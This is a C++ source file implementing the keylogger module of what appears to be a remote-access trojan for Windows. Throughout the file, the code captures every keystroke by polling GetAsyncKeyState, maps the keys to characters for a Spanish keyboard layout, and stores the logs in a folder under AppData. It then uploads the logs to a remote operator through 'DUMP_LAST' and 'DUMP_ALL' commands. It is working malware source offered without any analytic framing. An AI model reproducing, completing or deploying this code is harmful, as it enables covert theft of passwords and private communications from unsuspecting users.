#include "KeyLogger.h"

void KeyLogger::tryStart() {
    if (!recordingKeys.load()) {
        recordingKeys = true;
        std::thread keyloggerThread(&KeyLogger::start, this);
        keyloggerThread.detach();
    }
}

void KeyLogger::start() {
    while (recordingKeys.load()) {
        int shift = checkShift();
        int cap = GetKeyState(VK_CAPITAL);
        int altC = checkAltGr();


        if (GetAsyncKeyState(VK_SPACE) & 0x0001) {
            writeCharIntoLogFile(' ');
        } else if (GetAsyncKeyState(VK_LCONTROL) & 0x0001) {
            writeCharIntoLogFile("[LEFT-CONTROL]");
        } else if (GetAsyncKeyState(VK_RCONTROL) & 0x0001) {
            writeCharIntoLogFile("[RIGHT-CONTROL]");
        } else {
            for (int i = 48; i <= 250; i++) {
                if (GetAsyncKeyState(i) & 0x0001) {
                    switch (i) {
                        case 48:
                            if (shift)writeCharIntoLogFile("=");
                            else if (altC); else writeCharIntoLogFile("0");
                            break;
                        case 49:
                            if (shift)writeCharIntoLogFile("!");
                            else if (altC) writeCharIntoLogFile("|"); else writeCharIntoLogFile("1");
                            break;
                        case 50:
                            if (shift)writeCharIntoLogFile("\"");
                            else if (altC) writeCharIntoLogFile("@"); else writeCharIntoLogFile("2");
                            break;
                        case 51:
                            if (shift)writeCharIntoLogFile((char) 250);
                            else if (altC) writeCharIntoLogFile("#"); else writeCharIntoLogFile("3");
                            break;
                        case 52:
                            if (shift)writeCharIntoLogFile("$");
                            else if (altC) writeCharIntoLogFile("~"); else writeCharIntoLogFile("4");
                            break;
                        case 53:
                            (shift) ? writeCharIntoLogFile("%") : writeCharIntoLogFile("5");
                            break;
                        case 54:
                            if (shift)writeCharIntoLogFile("&");
                            else if (altC) writeCharIntoLogFile(char(172)); else writeCharIntoLogFile("6");
                            break;
                        case 55:
                            shift ? writeCharIntoLogFile("/") : writeCharIntoLogFile("7");
                            break;
                        case 56:
                            shift ? writeCharIntoLogFile("(") : writeCharIntoLogFile("8");
                            break;
                        case 57:
                            shift ? writeCharIntoLogFile(")") : writeCharIntoLogFile("9");
                            break;
                        case 65 ... 90:    // Alphabet
                            if (shift == cap) {
                                writeCharIntoLogFile((char) (i + 32));  // Minúscula
                            }
                            else {
                                writeCharIntoLogFile((char) (i));  // Mayúscula
                            }
                            break;
                        case 186:
                            if (shift) writeCharIntoLogFile("^");
                            else if (altC) writeCharIntoLogFile("["); else writeCharIntoLogFile("`");
                            break;
                        case 187:
                            if (shift) writeCharIntoLogFile("*");
                            else if (altC) writeCharIntoLogFile("]"); else writeCharIntoLogFile("+");
                            break;
                        case 188:
                            (shift) ? writeCharIntoLogFile(";") : writeCharIntoLogFile(",");
                            break;
                        case 189:
                            (shift) ? writeCharIntoLogFile("_") : writeCharIntoLogFile("-");
                            break;
                        case 190:
                            (shift) ? writeCharIntoLogFile(":") : writeCharIntoLogFile(".");
                            break;
                        case 191:
                            if (shift && !cap || !shift && cap) writeCharIntoLogFile(char(128));
                            else if (altC) writeCharIntoLogFile(char(125)); else writeCharIntoLogFile(char(135));
                            break;
                        case 192:
                            (shift && !cap || !shift && cap) ?
                            writeCharIntoLogFile((char) 165) :
                            writeCharIntoLogFile((char) 164);
                            break;
                        case 220:
                            if (shift) writeCharIntoLogFile(char(166));
                            else if (altC)writeCharIntoLogFile(char(92)); else writeCharIntoLogFile(char(220));
                            break;
                        case 222:
                            if (shift) writeCharIntoLogFile(char(249));
                            else if (altC) writeCharIntoLogFile("{"); else writeCharIntoLogFile(char(239));
                            break;
                        default:
                            break;
                    }

                }
            }
        }
        Sleep(10);
    }
}



bool KeyLogger::checkAltGr() {
    if (GetAsyncKeyState(VK_CONTROL) && GetAsyncKeyState(VK_MENU)) {
        return true;
    }
    return false;
}

void KeyLogger::writeCharIntoLogFile(const char *string) {
    if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
    std::ofstream fileStream;
    fileStream.open(logsFileName.c_str(), std::fstream::app);
    std::string detectedWindow = getCurrentWindow();
    if (tempWindow != detectedWindow && !detectedWindow.empty()) {
        tempWindow = getCurrentWindow();
    }
    fileStream << string;
    fileStream.close();
}

void KeyLogger::writeCharIntoLogFile(char string) {
    if (!std::filesystem::exists(pathOfLogs)) std::filesystem::create_directory(pathOfLogs);
    std::ofstream fileStream;
    fileStream.open(logsFileName.c_str(), std::fstream::app);
    std::string detectedWindow = getCurrentWindow();
    if (tempWindow != detectedWindow && !detectedWindow.empty()) {
        tempWindow = getCurrentWindow();
    }
    fileStream << string;
    fileStream.close();
}


std::string KeyLogger::getCurrentWindow() {
    char wnd_title[256];
    HWND hwnd = GetForegroundWindow();
    GetWindowText(hwnd, wnd_title, sizeof(wnd_title));
    return wnd_title;
}

bool KeyLogger::checkShift() {
    if (GetAsyncKeyState(VK_SHIFT) || GetAsyncKeyState(VK_RSHIFT)) { // check either of 2 shifts
        return true;
    }
    return false;
}



std::wstring KeyLogger::generateLogName() {
    return pathOfLogs + L"log_" + TimeCS::getCurrentDateTimeW() + L".log";
}

bool KeyLogger::lastLogExists() const {
    return std::filesystem::exists(logsFileName);
}

bool KeyLogger::logsExists() const {
    return std::filesystem::exists(pathOfLogs) && !std::filesystem::is_empty(pathOfLogs);

}

void KeyLogger::setStream(const Stream & stream){
    this->stream=stream;
}

void KeyLogger::send() {
    sendLastKeyloggerLog();
}

void KeyLogger::sendLastKeyloggerLog() {
    if (lastLogExists()) {
        stream.sendSize(1);
        stream.sendFile(logsFileName.c_str());
        logsFileName = generateLogName();
    } else {
        stream.sendSize(-1);
    }
}

void KeyLogger::sendAll() {
    if (logsExists()) {
        stream.sendSize(1);
        for (const auto &entry: std::filesystem::directory_iterator(pathOfLogs)) {
            stream.sendSize(0);
            if (std::filesystem::is_regular_file(entry)) stream.sendFile(entry.path().wstring().c_str());
            stream.readSize();
        }
        stream.sendSize(-1);
    } else {
        stream.sendSize(-1);
    }
}


KeyLogger::KeyLogger(const Stream & stream, std::unordered_map<std::string, std::function<void(nlohmann::json &)>> &actionMap) : Sender(stream, actionMap) {
#ifdef KEYLOGGER_DEF
    pathOfLogs = Install::getAppDataPath() + L"\\" + Converter::string2wstring(KEYLOGGER_DEF) + L"\\";
    logsFileName = generateLogName();
    actionMap["DUMP_LAST"] =[&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &KeyLogger::send);
    };
    actionMap["DUMP_ALL"] =[&](nlohmann::json& json) {
        threadGen.runInNewThread(this, &KeyLogger::sendAll);
    };



#endif
}




